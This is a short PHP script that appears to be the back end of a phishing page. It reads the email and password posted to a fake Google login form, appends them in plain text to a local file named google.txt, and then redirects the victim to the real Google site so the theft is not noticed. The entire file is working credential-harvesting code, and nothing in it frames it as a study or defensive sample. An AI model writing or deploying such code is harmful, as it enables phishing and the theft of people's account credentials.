<?php
$email = $_POST['email'];
$password = $_POST['password'];

$file = fopen("../data/google.txt", "a");
fwrite($file, "Email: $email\nPassword: $password\n\n");
fclose($file);

// Redirect to the real Google login page
header("Location: https://google.com");
exit();
?>